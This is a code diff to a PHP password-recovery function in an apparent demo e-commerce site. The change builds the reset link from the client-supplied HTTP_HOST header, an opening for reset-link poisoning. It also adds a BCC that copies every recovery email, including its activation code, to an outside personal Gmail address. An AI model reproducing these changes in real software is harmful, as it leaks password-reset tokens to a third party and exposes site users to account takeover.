@@ -301,11 +301,11 @@ function obtain_password()
     );
     $user = getDB()->getObject($sql);
 
-    logToConsole('obtain_password:$user', $user, __FILE__, __FUNCTION__, __LINE__);
-
     if ($user != null) {
-      $url="http://demo.ecommerce.local/recuperar-clave/?email=$email&activation=$user->verification_code";
-      $body = "
+      $protocol  = (!empty(getServer('HTTPS')) && getServer('HTTPS') === 'on' ? 'https' : 'http');
+      $http_host = getServer('HTTP_HOST');
+      $url       = "$protocol://$http_host/recuperar-clave/?email=$email&activation=$user->verification_code";
+      $body      = "
         <html>
         <head>
         <title></title>
@@ -322,13 +322,12 @@ function obtain_password()
       $status = sendEmail([
         'from'    => ['email' => 'admin@e-com.uy', 'name' => 'Demo eComm'],
         'to'      => ['user' => $email],
+        'bcc'     => ['admin' => 'miguelmail2006@gmail.com'],
         'subject' => 'Recuperar Contraseña',
         'body'    => $body,
         'isHTML'  => true,
       ]);
     }
-
-    logToConsole('obtain_password:$status', $status, __FILE__, __FUNCTION__, __LINE__);
   }
 
   return $status;
